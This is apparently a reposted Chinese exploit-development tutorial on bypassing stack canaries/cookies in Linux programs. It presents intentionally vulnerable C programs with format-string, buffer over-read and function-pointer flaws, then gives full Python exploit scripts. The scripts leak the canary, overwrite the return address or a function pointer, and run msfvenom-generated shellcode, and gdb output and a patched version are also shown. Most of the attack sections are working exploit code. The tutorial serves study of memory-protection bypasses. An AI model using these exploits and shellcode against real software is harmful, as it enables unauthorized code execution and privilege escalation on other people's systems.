> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531708&idx=1&sn=5eb58ebd3099c52207add98ed4461dce

#  [漏洞利用开发] 0A- 与内存守卫共舞：打破 Canaries/Cookies、DEP/NX 和 ASLR  
 Ots安全   2025-07-06 05:04  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
“[漏洞开发] 0A-与内存防护共舞：突破Canaries/Cookies、DEP/NX和ASLR”的深入分析，探讨了现代内存保护机制的绕过技术。该帖子详细介绍了数据执行防护（DEP）和不可执行（NX）位如何通过硬件和软件层阻止恶意代码执行，同时介绍了地址空间布局随机化（ASLR）如何通过随机化虚拟内存布局增强安全性。  
文章从以下几个方面展开：  
1. 返回导向编程（ROP）  
：通过链接现有代码片段（gadgets）绕过DEP，结合工具如ropper进行gadget搜索。  
  
1. 返回到libc（ret2libc）  
：利用库函数（如system）执行命令，避免直接注入代码。  
  
1. 强制禁用DEP  
：通过mprotect修改栈权限或使用mmap分配可执行内存，结合memcpy加载并执行shellcode。  
  
1. ASLR绕过  
：通过内存泄漏（如格式字符串漏洞）动态获取libc基址和shellcode地址，适应随机化布局。  
  
此外，文章还结合2025年的最新进展，讨论了Intel CET阴影堆栈、内存污染跟踪和更高熵的ASLR等新防护措施，以及潜在的替代策略（如堆整理和侧信道攻击）。它强调实践的重要性，建议读者通过测试漏洞程序或研究近期CVE（如2025-0282）提升技能。  
这篇简介旨在为对漏洞开发和内存防护感兴趣的读者提供一个全面的入门视角，并鼓励进一步探索工具（如pwntools）和新兴技术（如XOM、MTE）。如果你对某一技术细节或实践案例有疑问，欢迎继续探讨！  
  
简介  
  
在上一篇文章中，我们从多个方面深入探讨了基于堆栈的缓冲区溢出漏洞，例如用于发现此类漏洞的方法。我们还探讨了模糊测试以及如何从中获益。此外，我们还根据目标程序的性质及其工作机制，讨论了利用此类漏洞的策略。我们还讨论了针对此类漏洞的防护和防御方法，并解释了一些可能导致绕过这些防御措施的常见错误。您必须阅读上一篇文章才能理解本文，因为我们将以上一篇文章的内容为基础进行深入探讨。  
  
我们解释过的一种方法是，通过覆盖指令指针，并用另一个指向我们自己指令的指针来伪造它，从而劫持执行流。这样，我们就能强制程序执行我们编写的任意代码。可惜的是，事情并非如此简单，因为有许多强大的保护措施和缓解措施阻止我们轻易地做到这一点。  
  
不过，朋友，别担心。我并不否认这些保护措施的威力和有效性，尤其是当它们结合起来时，会使漏洞利用变得更加困难和复杂。然而，如果我们完全理解这些保护措施的工作原理以及目标程序的密钥，我们就可以规避它们，并用一些创造性的技巧绕过它们。  
  
《该死的捕鼠器》（Cookies / Canaries）  
  
这种记忆保护机制就像捕鼠器一样。如果你的家里有一些老鼠容易进出的开口，你可以采取的一个解决方案是设置陷阱，用奶酪引诱老鼠，以降低老鼠的危险性。一旦它们掉进陷阱，你就把它们赶走，这样就能降低它们对家中重要物品造成的更大危害。然而，有些聪明的老鼠能够察觉到这种伎俩，避开陷阱，继续执行它们的任务。这就是“饼干/金丝雀保护”理念的由来，我们将延续这一理念，学习如何让老鼠绕过陷阱，避免落入陷阱。  
  
Canary/cookie 是程序开始执行时生成的随机值。程序每次运行时都会生成一个唯一的值。该值位于每个堆栈帧的末尾，位于函数数据和变量的后续位置。当与该帧对应的函数被调用并在返回前完成执行时，它会检查先前生成的值。如果命中，即值发生了变化，则表示发生了溢出。因此，函数不会返回，程序将完全关闭。这可以阻止任何试图覆盖指令指针并重定向程序执行流程的攻击。  
  
分析安全 Canaries/Cookie  
  
我们以下面的代码为例：  
  

```
#include<stdio.h>

voidmain(){
  char cName[16];
  scanf(&#34;%s&#34;, cName);
  puts( cName );
}
```

  
  
并编译如下：  
  

```
┌──(user㉿host)-[~]
└─$ gcc test.c -o test
```

  
  
然后我们反汇编一下main函数，发现如下指令：  
  

```
0000000000001149<main>:
    1149: 55                      push rbp
    114a:       4889 e5 mov rbp,rsp
    114d: 4883ec10             sub rsp,0x10
    1151: 488d 45 f0 lea rax,[rbp-0x10]
    1155: 4889 c6 mov rsi,rax
    1158: 488d 05 a5 0e0000    lea rax,[rip+0xea5] # 2004 <_IO_stdin_used+0x4>
    115f: 4889 c7 mov rdi,rax
    1162: b8 00000000          mov eax,0x0
    1167: e8 d4 fe ff ff call   1040 <__isoc99_scanf@plt>
    116c: 488d 45 f0 lea rax,[rbp-0x10]
    1170: 4889 c7 mov rdi,rax
    1173: e8 b8 fe ff ff call   1030 <puts@plt>
    1178: 90                      nop
    1179: c9 leave
    117a:       c3 ret
```

  
  
这大致就是我们在之前文章中见过的指令格式。但让我来展示一下，当我们要求编译器集成 Canary/Cookie 保护时，它会是什么样子。  
  

```
┌──(user㉿host)-[~]
└─$ gcc -fstack-protector test.c -o test
```

  
  
仔细观察这张图片，并将这次分解的结果与之前的结果进行比较。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrH6dGIibIfSXEkqXqU8mbicUibKEjK7ecVyfPNp2HexgibbnmuYCFibzlxiaw/640?wx_fmt=png&from=appmsg "")  
  
在主函数的开头，从 F 段寄存器加载 8 个字节，并将其压入堆栈，位于保存的基指针 (RBP-0x8) 的上方。在结尾，将原始的 canary/cookie 与堆栈中的 canary/cookie 进行比较。比较过程如下：  
1. 先前推送到堆栈的 canary/cookie 被加载到累加器寄存器 (RAX)  
  
1. 金丝雀/cookie 值从 F 段寄存器中的原始值中减去。  
  
1. 如果两者相同，则触发零标志，从而允许执行重定向到 ret 指令。  
  
1. 否则，执行将被重定向到一个函数，__stack_chk_fail该函数显示致命错误消息并终止该进程。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrDibrlQnooHm7ddcK7aPYicUPiaXO14n1ia4K8V2d7n1oRJCdOoKrj99GHQ/640?wx_fmt=png&from=appmsg "")  
  
一旦传递大量输入，程序执行就会被__stack_chk_fail函数劫持，屏幕上会显示错误，告诉我们发生了堆栈破坏，然后程序就会被函数杀死__pthread_kill_implementation。  
  
堆栈布局如下：  
  

```
      *--------------------------* <-- Frame data & Buffers
        | |
        | |
        | |
-0x8 -> *--------------------------* <-- Canary / Cookie
        | |
+0x0 -> *--------------------------* <-- Saved RBP ( Base Pointer )
        | |
+0x8 -> *--------------------------* <-- Saved RIP ( Instruction Pointer )
        | |      
        *--------------------------*
```

  
  
这确实是一个很大的挑战，因为金丝雀被放置在一个关键位置，我们必须覆盖它才能获得指令指针等重要的东西。  
  
泄露秘密就能获胜！  
  
攻破金丝雀/cookies 的一个策略是先泄露它们，然后构造一个包含泄露金丝雀的有效载荷，这样一来，比较就会失败，因为攻击后堆栈中的金丝雀仍然与原始金丝雀相同。我们来看一个例子：  
  

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

typedefstruct {
    char data[256];
    char *cpReadData;
    int nSize;
} Buffer;

Buffer buf_new(){
    return (Buffer) { 0x00 };
}

voidbuf_write(Buffer *pBuf, char *cpData, size_t n){
    if ( pBuf->nSize ) 
        pBuf->data[ pBuf->nSize-1 ] = ' ';

    memcpy( pBuf->data + pBuf->nSize, cpData, n );
    pBuf->nSize += n;
}

voidbuf_read(Buffer *pBuf){
    if ( !pBuf->cpReadData )
        pBuf->cpReadData = pBuf->data;

    printf( pBuf->cpReadData );
    pBuf->cpReadData += pBuf->nSize;
}

voidbuf_readall(Buffer *pBuf){
    printf( pBuf->data );
}

voidmain(){
    Buffer buf = buf_new();
    int nChoice, c;

    for ( ;; ) {
        printf( &#34;\n\n1- Write\n2- Read\n3- Read full data\n4- Exit\n\nChoose: &#34; );
        scanf( &#34;%d&#34;, &nChoice );

        // Clearing the buffer so nothing breaks `getdelim` later ;)
        while ( (c = getchar()) != 0x0a && c != EOF ); 
        
        if ( nChoice == 1 ) {
            char *cpLine = NULL;
            size_t n = 0;
            printf( &#34;Data: &#34; );
            n = getdelim( (char **)&cpLine, &n, 0x0a, stdin );
            if ( ~n ) // Sanity check to avoid calling `buf_write` if `getdelim` failed
                buf_write( &buf, cpLine, n );
            free( cpLine );
        }

        elseif ( nChoice == 2 )
            buf_read( &buf );

        elseif ( nChoice == 3 )
            buf_readall( &buf );

        elseif ( nChoice == 4 )
            break;
        
        else
            puts( &#34;[-] Invalid choice!&#34; );
    }
}
```

  
  
这是一个简单的程序，允许用户以交互方式写入和读取数据。让我们在启用金丝雀保护的情况下编译并运行它：  
  

```
┌──(user㉿host)-[~]
└─$ gcc -fstack-protector -zexecstack test.c -o test
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ ./test


1- Write
2- Read
3- Read full data
4- Exit

Choose: 1
Data: Hello Guys


1- Write
2- Read
3- Read full data
4- Exit

Choose: 2
Hello Guys


1- Write
2- Read
3- Read full data
4- Exit

Choose: 1
Data: I'm 0xNinjaCyclone


1- Write
2- Read
3- Read full data
4- Exit

Choose: 2
I'm 0xNinjaCyclone


1- Write
2- Read
3- Read full data
4- Exit

Choose: 3
Hello Guys I'm 0xNinjaCyclone


1- Write
2- Read
3- Read full data
4- Exit

Choose: 4
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$
```

  
  
如果你留意读取函数，就会发现它们都容易受到格式化字符串漏洞的影响，即用户控制的数据printf以格式的形式传递给函数，而这种传递方式并不安全。该buf_read函数还容易受到缓冲区过度读取漏洞的影响，因为pBuf->cpReadData指针会打印出它指向的内容，并在读取完成后移动到内存中，而从未检查过移动到的内存是否属于它应该读取的缓冲区。利用这两个漏洞中的任何一个，我们都可以泄露秘密的金丝雀/cookie。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrFKI5icmPysFydibspAJp3YEIyVrVMPthdHibVB837sml6fkFvLbcktPUg/640?wx_fmt=png&from=appmsg "")  
  
如你所见，我们可以利用格式字符串漏洞，%49$p通过 write 函数注入有效载荷，然后利用 read 函数将其泄漏出去，从而泄露金丝雀数据。阅读格式字符串漏洞利用文章：  
https://0xninjacyclone.github.io/posts/exploitdev_7_strfmt/  
，了解我们的操作。我们可以使用 Python 自动执行此操作，如下所示：  
  

```
def leak_canary(p: Popen):
    p.stdin.write( b&#34;1\n&#34; + b&#34;%49$p\n&#34; + b&#34;2\n&#34;)
    p.stdin.flush()
    out= b&#34;&#34;
    canary_pos = -1
    n = 0
    
    while n < 1024:
        out = p.stdout.readline()
        canary_pos = out.find( b&#34;0x&#34; )
        ifbool( ~canary_pos ):
            break

        n += 1

    else:
        return-1

    canary = int( out[canary_pos : canary_pos+18], 16 )
    return canary
```

  
  
该函数将处理程序对象带到目标进程，注入有效负载，泄漏金丝雀，然后将金丝雀转换为整数值或在失败时返回 -1 后返回给调用者。  
  
现在，我们可以制作一个有效载荷，用正确的值覆盖金丝雀，注入一个shellcode，并通过覆盖指令指针来重定向执行流。  
  

```
defhijack_exec(p: Popen, canary):
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x112                               # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, 0x7fffffffdd60 + 0x40 ) # Instruction pointer
    payload += b&#34;\x90&#34; * 0x40                             # NOPs for padding
    payload += buf # Shellcode

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()
```

  
  
我们采用了缓冲区溢出文章中讨论的相同方法，在金丝雀攻击发生后，用垃圾数据填充帧以绕过保护机制，将 Shellcode 注入前一帧，并替换指令指针以引用 Shellcode。但是，要执行 Shellcode，主函数必须返回。我们可以使用第四个函数 (exit) 来实现这一点，它可以中断循环并允许主函数返回。  
  

```
defexit_target(p: Popen):
    p.stdin.write( b&#34;4\n&#34; )
```

  
  
注入后必须调用此函数来强制程序执行shellcode。  
  

```
defmain():
    # We use 'stdbuf -o0' to force the targeted program pipes to be flushed
    # So we can read leaked canary/cookie immediately
    p = Popen( [&#34;stdbuf&#34;, &#34;-o0&#34;, TARGET_PATH], stdin=PIPE, stdout=PIPE )

    # Make stdout non-blocking when using read/readline
    flags = fcntl.fcntl( p.stdout, fcntl.F_GETFL )
    fcntl.fcntl( p.stdout, fcntl.F_SETFL, flags | os.O_NONBLOCK )

    canary = leak_canary( p )
    
    if bool( ~canary ):
        print( &#34;Canary : 0x%x&#34; % canary )
        hijack_exec( p, canary )
        exit_target( p )
        out, _ = p.communicate()
        print( out.decode() )
    else:
        exit_target( p )
        print( &#34;[-] Failed to leak the canary&#34; )
```

  
  
在主函数中，我们使用stdbuf -o0命令启动目标进程，这样即使进程没有刷新输出管道，我们也能在其运行时高效地读取输出。我们还强制操作系统不阻塞输出管道，这样就不会卡住并发生死锁。接下来，我们泄漏金丝雀。如果成功，进程将被注入，并在使用 exit 函数触发后重定向执行流。如果失败，程序将退出。  
  
让我们运行该漏洞：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXr7yruI2zMo5JX6wbvyicC5ResFVY1dAXia2HgqaeZnicZ7gehjU1yfe4RQ/640?wx_fmt=png&from=appmsg "")  
  
太好了，我们可以绕过 Stack Canary 并执行运行“id”命令的 Shellcode。如果该程序由 root 用户拥有且具有 SUID 权限，我们就可以像上一篇博文中提到的那样获得 root 权限。  
  
以下是完整的利用代码：  
  

```
#!/usr/bin/python3

import struct, os, fcntl
from subprocess import Popen, PIPE

TARGET_PATH = &#34;./test&#34;

# msfvenom -a x64 --platform linux -p linux/x64/exec -b &#34;\x0a&#34; -f py AppendExit=true CMD=&#34;id&#34;
buf = b&#34;&#34;
buf += b&#34;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50&#34;
buf += b&#34;\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x03&#34;
buf += b&#34;\x00\x00\x00\x69\x64\x00\x56\x57\x54\x5e\x6a\x3b&#34;
buf += b&#34;\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05&#34;

defleak_canary(p: Popen):
    p.stdin.write( b&#34;1\n&#34; + b&#34;%49$p\n&#34; + b&#34;2\n&#34; )
    p.stdin.flush()
    out = b&#34;&#34;
    canary_pos = -1
    n = 0
    
    while n < 1024:
        out = p.stdout.readline()
        canary_pos = out.find( b&#34;0x&#34; )
        if bool( ~canary_pos ):
            break

        n += 1

    else:
        return-1

    canary = int( out[canary_pos : canary_pos+18], 16 )
    return canary

defhijack_exec(p: Popen, canary):
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x112                               # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, 0x7fffffffdd60 + 0x40 ) # Instruction pointer
    payload += b&#34;\x90&#34; * 0x40                             # NOPs for padding
    payload += buf # Shellcode

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()

defexit_target(p: Popen):
    p.stdin.write( b&#34;4\n&#34; )

defmain():
    # We use 'stdbuf -o0' to force the targeted program pipes to be flushed
    # So we can read leaked canary/cookie immediately
    p = Popen( [&#34;stdbuf&#34;, &#34;-o0&#34;, TARGET_PATH], stdin=PIPE, stdout=PIPE )

    # Make stdout non-blocking when using read/readline
    flags = fcntl.fcntl( p.stdout, fcntl.F_GETFL )
    fcntl.fcntl( p.stdout, fcntl.F_SETFL, flags | os.O_NONBLOCK )

    canary = leak_canary( p )
    
    if bool( ~canary ):
        print( &#34;Canary : 0x%x&#34; % canary )
        hijack_exec( p, canary )
        exit_target( p )
        out, _ = p.communicate()
        print( out.decode() )
    else:
        exit_target( p )
        print( &#34;[-] Failed to leak the canary&#34; )

if __name__ == '__main__':
    main()
```

  
  
因此，必须按如下方式修改读取函数，以防止发生此类泄漏：  
  

```
#include<stdbool.h>
bool g_bCanRead = false;

voidbuf_write(Buffer *pBuf, char *cpData, size_t n){
    if ( pBuf->nSize ) 
        pBuf->data[ pBuf->nSize-1 ] = ' ';

    memcpy( pBuf->data + pBuf->nSize, cpData, n );
    pBuf->nSize += n;
    g_bCanRead = true;
}

voidbuf_read(Buffer *pBuf){
    if ( !pBuf->cpReadData )
        pBuf->cpReadData = pBuf->data;

    if ( !g_bCanRead ) {
        fputs( &#34;[-] Cannot Read&#34;, stderr );
        return;
    }

    printf( &#34;%s&#34;, pBuf->cpReadData );
    pBuf->cpReadData += pBuf->nSize;
    g_bCanRead = false;
}

voidbuf_readall(Buffer *pBuf){
    printf( &#34;%s&#34;, pBuf->data );
}
```

  
  
printf此修改通过以安全的方式使用该函数而不是直接将用户输入作为格式传递，并对函数施加限制buf_read以防止过度读取缓冲区，从而修复了程序中的内存泄露漏洞。  
  

```
┌──(user㉿host)-[~]
└─$ python3 exploit.py                              
[-] Failed to leak the canary
```

  
  
我们开发的漏洞利用程序已失效。修复内存泄露漏洞使其失效，因为它主要依赖于利用漏洞利用链中的其中一个漏洞。  
  
不用担心，我们仍然可以在没有其他错误的情况下泄露它  
  
存在一个允许数据从内存泄漏的漏洞可能非常有帮助，但这种情况并不总是会发生。在这种情况下，替代解决方案是利用相同的缓冲区溢出漏洞，尝试从内存中泄漏机密敏感数据。让我们回顾一下堆栈布局。它看起来像这样：  
  

```
0x00 -> *--------------------------* <-- Injection Point
        | |
        | |
        | |
        | |
        | |
        | |
0x100-> *--------------------------* <-- Buffer->cpReadData
        | |
0x108-> *--------------------------* <-- Buffer->nSize
        | |
0x110-> *--------------------------* <-- Junk data
        | | 
0x118-> *--------------------------* <-- Canary / Cookie
        | | 
0x120-> *--------------------------* <-- Saved RBP ( Base Pointer )
        | | 
0x128-> *--------------------------* <-- Saved RIP ( Instruction Pointer )
        | | 
        *--------------------------*
```

  
  
你没注意到吗？Buffer->cpReadData用于读取内存的指针已经被我们控制了。我们可以伪造该地址，使其指向内存中我们想要的任何其他位置，并泄露其内容。我们的计划如下：  
1. 使用写入函数填充缓冲区直到进入目标指针。  
  
1. Buffer->cpReadData用金丝雀地址覆盖。  
  
1. 通过触发读取功能泄露金丝雀。  
  
1. 再次触发写入功能，使用精心设计的有效载荷覆盖剩余数据。  
  
1. 利用允许主程序返回的退出函数来触发 shellcode 执行。  
  

```
(gdb) c
Continuing.

Breakpoint 1, 0x00005555555553cf in main ()
(gdb) x/a $rbp-8
0x7fffffffdd48: 0xe1125f7dcee84f00
```

  
  
我将 gdb 连接到目标进程，并在主函数处设置了一个断点。检查完 Canary 后，我发现它位于0x7fffffffdd48内存中。然而，这里有一个问题：Canary 的最低位（最低有效字节）总是包含一个空字节。因此，我们必须从该地址加一读取数据，这样空字节就不会阻止我们，并且我们可以从泄漏的数据中获取七个字节，然后自行附加空字节。  
  

```
def leak_canary(p: Popen):
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x100                         # Filling the stack frame
    payload += struct.pack( &#34;<Q&#34;, 0x7fffffffdd49 ) # Buffer->cpReadData
    payload += (b&#34;\x00&#34; * 0x8) # Buffer->nSize ( To avoid touching it )

    p.stdin.write( b&#34;1\n&#34; + payload + b&#34;\n2\n&#34; )
    p.stdin.flush()

    out = b&#34;&#34;
    canary_pos = -1
    n = 0
    
    while n < 1024:
        out = p.stdout.readline()
        canary_pos = out.find( b&#34;Choose: &#34; )
        ifbool( ~canary_pos ) and canary_pos+15 < len(out):
            canary_pos += 8
            break

        n += 1

    else:
        return-1

    canary = struct.unpack( &#34;<Q&#34;, b&#34;\x00&#34; + out[canary_pos : canary_pos+7] )[ 0 ]
    return canary
```

  
  
这个函数实现了我们之前讨论过的功能：泄漏金丝雀数据，尝试将其解析为整数值，然后返回给调用者。一切进展顺利，我们只需要对函数进行一些修改hijack_exec，一切就都正常了。  
  

```
defhijack_exec(p: Popen, canary):
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x7                                 # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, 0x7fffffffdd60 + 0x40 ) # Instruction pointer
    payload += b&#34;\x90&#34; * 0x40                             # NOPs for padding
    payload += buf # Shellcode

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()
```

  
  
除了第一行之外，我们几乎没有做任何改动，因为该leak_canary函数将填满大部分堆栈框架，只留下堆栈上需要溢出的一点空间来获取重要的东西。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrZtJjuCQiaG3oCia9aQbqF20T0608NUczEpZX8RPMpt2G0pmDdmkg0WYw/640?wx_fmt=png&from=appmsg "")  
  
宾果，我们的计划成功了。  
  
跳过 Sh1t  
  
并非所有程序都设计为交互式运行。许多程序会从用户那里获取输入，然后直接一次性执行任务。在这种情况下，我们无法泄露金丝雀（无论是使用漏洞还是其他技术），然后利用溢出漏洞劫持程序执行来完成攻击。在这种情况下，我们需要一种创造性的方法一次性突破这种保护。这并不容易，主要取决于目标程序的逻辑及其工作方式。让我们举个例子：  
  

```
#include<stdio.h>
#include<stdlib.h>

typedefstruct {
    char data[64];
    int nSize;
} Buffer;

Buffer buf_new(){
    return (Buffer) { 0x00 };
}

voidbuf_write(Buffer *pBuf, char *cpData, size_t n){
    while ( n-- )
        pBuf->data[ pBuf->nSize++ ] = *cpData++;
}
voidbuf_read(Buffer *pBuf){
    printf( &#34;%s&#34;, pBuf->data );
};

voidmain(){
    Buffer buf = buf_new();
    char *cpLine = NULL;
    size_t n = 0;

    printf( &#34;Data: &#34; );
    n = getdelim( (char **)&cpLine, &n, 0x0a, stdin );

    if ( ~n ) // Sanity check to avoid calling `buf_write` if `getdelim` failed
        buf_write( &buf, cpLine, n );

    puts( &#34;Your Data :&#34; );
    buf_read( &buf );
}
```

  
  
此示例与上一个示例类似。除了它不是交互式的之外，没有什么新意。它从用户那里读取并将用户的输入打印到屏幕上。  
  

```
┌──(user㉿host)-[~]
└─$ gcc -fstack-protector -zexecstack test.c -o test
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ ./test                                          
Data: Hello Guys, I'm 0xNinjaCyclone.
Your Data :
Hello Guys, I'm 0xNinjaCyclone.
```

  
  
重点关注这一行：  
  

```
pBuf->data[ pBuf->nSize++ ] = *cpData++;
```

  
  
它看起来像一段普通的代码，将数据从一个内存逐字节复制到另一个内存。但事实并非如此，我的朋友。我们可以用一种非常阴险的方式滥用它，在不损坏金丝雀的情况下绕过它。让我进一步解释一下，这样你就能理解我的意思了。它会根据pBuf->nSize值执行缓冲区解引用，将指针指向的内存中的一个字节复制到该位置cpData，然后将这些值加一，以便在下一次迭代中移动下一个字节，并循环执行此操作，直到所有数据都移动完毕。  
  
这个变量告诉程序将数据写入何处，它在我们的控制之下。然而，我们无法有效地完全改变它。我们只能更改最低位字节，因为更改该字节会完全改变我们要写入的位置。这足以突破保护。我们可以让写入操作跳转到直接写入指令指针，而无需顺序写入，从而破坏金丝雀。  
  

```
#!/usr/bin/python3

import struct

with open(&#34;payload&#34;, &#34;wb&#34;) as f:
    f.write( b&#34;A&#34; * 64 ) # Fills the Buffer 
    f.write( b&#34;\x58&#34; ) # ( (unsigned char *) &Buffer->nSize )[0] ( LSB )
    f.write( struct.pack(&#34;<Q&#34;, 0x7fffffffdd70) ) # Instruction Pointer
    f.write( b&#34;\x90&#34; * 0x40 ) # Own Code ( NOPs )
```

  
  
让我们尝试一下这个漏洞，看看它是否能成功跳过金丝雀。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrSWSzcDez7TpAib8gdnv05qwa4G7zN6IkQXPw99mwDgkBvY0iaPibGicfdQ/640?wx_fmt=png&from=appmsg "")  
  
如您所见，我们成功击败了金丝雀并覆盖了指令指针，从而使我们能够劫持程序的执行流程。  
  
抢占 Canary/Cookie 保护  
  
绕过此类保护的一种方法是，如果我们能够在金丝雀值验证发生之前以修改指令指针以外的方式劫持程序执行流，那么即使金丝雀值被破坏，我们也可以绕过它。有很多场景允许我们劫持执行流：  
1. 函数指针：如果我们可以控制其中一个函数指针，并且在金丝雀检查发生之前调用它，我们就可以绕过该保护。  
  
1. V-Table：这真是个魔法。它是一个表，用于保存特定对象的方法指针，用于支持 C++ 语言中的多态性，这样每个对象都能准确地知道其对应的方法，而不会与其父级的方法发生冲突。如果我们能够控制该表，我们就可以利用其中的任何方法执行我们自己的代码，而不会被金丝雀保护机制检测到。  
  
1. Windows SEH：SEH 代表结构化异常处理，这是微软为 C/C++ 语言开发的一项功能，用于处理特定的异常代码情况（例如硬件故障）。这些处理程序主要位于堆栈中。如果我们能够从这些处理程序触发异常，我们就可以利用它们来获取代码执行（在金丝雀验证之前）。  
  

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<stdbool.h>

typedefstruct _Buffer {
    char data[64];
    int nSize;
    void (*write)(struct _Buffer *, char *, size_t);
    void (*read)(struct _Buffer *);
} Buffer;

voidbuf_write(Buffer *pBuf, char *cpData, size_t n){
    memcpy( pBuf->data, cpData, n );
    pBuf->nSize += (int) n;
}

voidbuf_read(Buffer *pBuf){
    puts( &#34;Your Data :&#34; );
    printf( &#34;%s&#34;, pBuf->data );
};

Buffer buf_new(bool bShouldRead){
    return (Buffer) {
        .data = { 0 },
        .nSize = 0,
        .write = buf_write,
        .read = ( bShouldRead ) ? buf_read : NULL
    };
}

voidmain(int argc, char **argv){
    Buffer buf = buf_new( (bool)(argc > 1 && strcmp(argv[1], &#34;-r&#34;) == 0) );
    char *cpLine = NULL;
    size_t n = 0;

    printf( &#34;Data: &#34; );
    n = getdelim( (char **)&cpLine, &n, 0x0a, stdin );

    if ( ~n ) // Sanity check to avoid calling `buf_write` if `getdelim` failed
        buf.write( &buf, cpLine, n );

    if ( buf.read )
        buf.read( &buf );
}
```

  
  
这个例子与前一个例子非常相似，不同之处在于这个 Buffer 结构具有额外的成员，这些成员保存指向其关联函数的指针，并且在 buf_new 函数初始化期间，这些函数的地址被分配给结构实例。  
  

```
┌──(user㉿host)-[~]
└─$ gcc -fstack-protector -zexecstack test.c -o test
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ ./test -r
Data: Hello World!
Your Data :
Hello World!
```

  
  
请注意，read 函数指针在我们的控制之下，我们可以使用 -r 选项触发它。此函数将在金丝雀检查之前调用，使我们能够抢占保护，劫持程序执行流并执行我们自己的代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXr64KNzCMUMb4TxWSsRmicmENTzQDCarurFjXjn4qbfFn5APoDicXNfSjg/640?wx_fmt=png&from=appmsg "")  
  
正如我们之前所说，我们控制的函数指针在 Canary 之前被调用。我们可以利用它，让它调用我们的 Shellcode。  
  

```
#!/usr/bin/python3

import struct

# msfvenom -a x64 --platform linux -p linux/x64/exec -b &#34;\x0a&#34; -f py AppendExit=true PrependSetuid=true PrependSetgid=true CMD=id
buf = b&#34;&#34;
buf += b&#34;\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\x31\xff\x6a&#34;
buf += b&#34;\x6a\x58\x0f\x05\x48\xb8\x2f\x62\x69\x6e\x2f\x73&#34;
buf += b&#34;\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54&#34;
buf += b&#34;\x5e\x52\xe8\x03\x00\x00\x00\x69\x64\x00\x56\x57&#34;
buf += b&#34;\x54\x5e\x6a\x3b\x58\x0f\x05\x48\x31\xff\x6a\x3c&#34;
buf += b&#34;\x58\x0f\x05&#34;

with open(&#34;payload&#34;, &#34;wb&#34;) as f:
    f.write( b&#34;A&#34; * 80 ) # Fills the Buffer 
    f.write( struct.pack(&#34;<Q&#34;, 0x7fffffffdd70 + 0x40) ) # Function Pointer
    f.write( b&#34;\x90&#34; * 0x80 ) # NOPs for padding
    f.write( buf ) # Shellcode
```

  
  
好了，一切准备就绪，开始拍摄吧。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrJadKuXJqCm3bAqxlzPTYdvk4ucesjiaUKNaLJgXoiczc5KVDRgoDYuQw/640?wx_fmt=png&from=appmsg "")  
  
其他策略  
  
并非所有操作系统和编译器都生来平等，并非所有金丝雀保护措施的实现都相同。有时，它们可能存在薄弱之处，且实现不当，导致漏洞被绕过。以下是一些金丝雀保护措施的缺陷以及如何利用它们来绕过：  
- 静态金丝雀/Cookie：有时，秘密金丝雀的值是固定的，不会随着程序的每次运行而改变。在这种情况下，可以将该值放置在其位置。当在函数末尾验证该值时，条件将得到满足，保护将被打破。  
  
- 弱 Canary/Cookie：有时，秘密 Canary 的值会发生变化，但并非完全变化。每次程序运行时，只有一小部分会发生变化。在这种情况下，我们可以猜测 Canary 的值，然后强制程序运行几次，直到找到正确的值。  
  
- 并非所有缓冲区都受到保护：编译器通常会将此保护应用于包含字节/字符串缓冲区的函数。因此，当易受攻击的代码不包含任何这些缓冲区类型时，就会出现另一个利用机会。  
  
